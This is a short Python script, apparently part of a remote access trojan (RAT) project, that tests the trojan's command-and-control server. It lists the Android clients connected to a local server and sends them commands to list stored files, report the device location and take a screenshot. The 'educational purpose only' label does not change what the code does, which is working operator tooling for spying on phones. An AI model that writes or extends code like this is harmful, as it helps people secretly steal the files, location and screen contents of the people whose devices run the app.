#!/usr/bin/env python3
"""
Test script for RAT server commands
Educational purpose only - for testing with emulator
"""

import requests
import json
import time

SERVER_URL = "http://localhost:8080"

def test_server_status():
    """Test server status"""
    try:
        response = requests.get(f"{SERVER_URL}/")
        print(f"Server Status: {response.json()}")
        return True
    except Exception as e:
        print(f"Server not running: {e}")
        return False

def get_connected_clients():
    """Get list of connected clients"""
    try:
        response = requests.get(f"{SERVER_URL}/clients")
        clients = response.json()
        print(f"Connected clients: {len(clients)}")
        for client_id, info in clients.items():
            print(f"  Client {client_id}: {info}")
        return clients
    except Exception as e:
        print(f"Error getting clients: {e}")
        return {}

def send_command(client_id, command, **kwargs):
    """Send command to client"""
    try:
        data = {
            "client_id": client_id,
            "command": command,
            **kwargs
        }
        response = requests.post(f"{SERVER_URL}/send_command", json=data)
        print(f"Command sent: {response.json()}")
        return response.json()
    except Exception as e:
        print(f"Error sending command: {e}")
        return None

def main():
    print("=== RAT Server Test Script ===")
    print("Educational purpose only\n")
    
    # Test server
    if not test_server_status():
        print("Start the server first: python server/app.py")
        return
    
    print("\nWaiting for client connections...")
    time.sleep(2)
    
    # Get clients
    clients = get_connected_clients()
    
    if not clients:
        print("No clients connected. Start the Android app first.")
        return
    
    # Use first client
    client_id = list(clients.keys())[0]
    print(f"\nTesting with client: {client_id}")
    
    # Test commands
    print("\n=== Testing Commands ===")
    
    # Test file listing
    print("\n1. Testing file listing...")
    send_command(client_id, "list_files", path="/storage/emulated/0/")
    time.sleep(1)
    
    # Test location
    print("\n2. Testing location...")
    send_command(client_id, "location")
    time.sleep(1)
    
    # Test screenshot (disabled for security)
    print("\n3. Testing screenshot...")
    send_command(client_id, "screenshot")
    time.sleep(1)
    
    print("\nTest completed. Check server logs for responses.")

if __name__ == "__main__":
    main()